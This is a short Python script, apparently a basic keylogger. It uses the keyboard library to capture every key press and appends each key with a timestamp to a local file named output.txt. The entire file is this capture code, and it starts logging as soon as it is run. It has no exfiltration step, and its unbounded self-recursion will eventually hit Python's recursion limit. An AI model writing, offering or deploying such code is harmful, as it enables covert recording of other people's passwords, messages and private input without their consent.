import keyboard
import datetime

def logger():
    key = keyboard.read_key()
    writeToFile(key)
    logger()

def writeToFile(key):
    # get current date and time
    now = datetime.datetime.now()
    now = str(now)
    f = open("output.txt", "a")
    f.write(now + " " + key + "\n")
    f.close()

logger()